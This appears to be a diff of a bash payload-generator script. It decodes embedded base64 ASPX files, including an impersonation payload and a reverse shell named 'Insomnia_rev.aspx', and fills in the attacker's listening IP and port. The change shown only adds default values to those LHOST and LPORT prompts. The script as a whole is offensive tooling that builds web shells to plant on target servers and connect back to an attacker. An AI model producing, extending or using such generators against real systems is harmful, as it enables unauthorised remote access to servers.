@@ -999,9 +999,11 @@ case $1 in
         "")
             echo -n $Insomnia_Impersonate| base64 -d > "$PWD/Insomnia_imp.aspx"
             echo
-            read -p "LHOST: " LHOST
+            read -p "Please enter your listening IP [$myip]: " LHOST
+            LHOST=${LHOST:-$myip}
             $sed -i "s/LHOST/$LHOST/" "$PWD/Insomnia_imp.aspx"
-            read -p "LPORT: " LPORT
+            read -p "Please enter your listening port [$myport]: " LPORT
+            LPORT=${LPORT:-$myport}
             $sed -i "s/LPORT/$LPORT/" "$PWD/Insomnia_imp.aspx"
             read -p "Username: " my_user
             $sed -i "s/my_user/$my_user/" "$PWD/Insomnia_imp.aspx"
@@ -1016,9 +1018,11 @@ case $1 in
         *)
             echo -n $Insomnia_Impersonate| base64 -d > "$ans/Insomnia_imp.aspx"
             echo
-            read -p "LHOST: " LHOST
+            read -p "Please enter your listening IP [$myip]: " LHOST
+            LHOST=${LHOST:-$myip}
             $sed -i "s/LHOST/$LHOST/" "$ans/Insomnia_imp.aspx"
-            read -p "LPORT: " LPORT
+            read -p "Please enter your listening port [$myport]: " LPORT
+            LPORT=${LPORT:-$myport}
             $sed -i "s/LPORT/$LPORT/" "$ans/Insomnia_imp.aspx"
             read -p "Username: " my_user
             $sed -i "s/my_user/$my_user/" "$ans/Insomnia_imp.aspx"
@@ -1041,9 +1045,11 @@ case $1 in
         "")
             echo -n $Insomniarev| base64 -d > "$PWD/Insomnia_rev.aspx"
             echo
-            read -p "LHOST: " LHOST
+            read -p "Please enter your listening IP [$myip]: " LHOST
+            LHOST=${LHOST:-$myip}
             $sed -i "s/LHOST/$LHOST/" "$PWD/Insomnia_rev.aspx"
-            read -p "LPORT: " LPORT
+            read -p "Please enter your listening port [$myport]: " LPORT
+            LPORT=${LPORT:-$myport}
             $sed -i "s/LPORT/$LPORT/" "$PWD/Insomnia_rev.aspx"
             echo "Saving $1 to: $PWD/Insomnia_rev.aspx"
             read -p "Press enter to go back to the main menu"
@@ -1052,9 +1058,11 @@ case $1 in
         *)
              echo -n $Insomniarev| base64 -d > "$ans/Insomnia_rev.aspx"
             echo
-            read -p "LHOST: " LHOST
+            read -p "Please enter your listening IP [$myip]: " LHOST
+            LHOST=${LHOST:-$myip}
             $sed -i "s/LHOST/$LHOST/" "$ans/Insomnia_rev.aspx"
-            read -p "LPORT: " LPORT
+            read -p "Please enter your listening port [$myport]: " LPORT
+            LPORT=${LPORT:-$myport}
             $sed -i "s/LPORT/$LPORT/" "$ans/Insomnia_rev.aspx"
             echo "Saving $1 to: $ans/Insomnia_rev.aspx"
             read -p "Press enter to go back to the main menu"
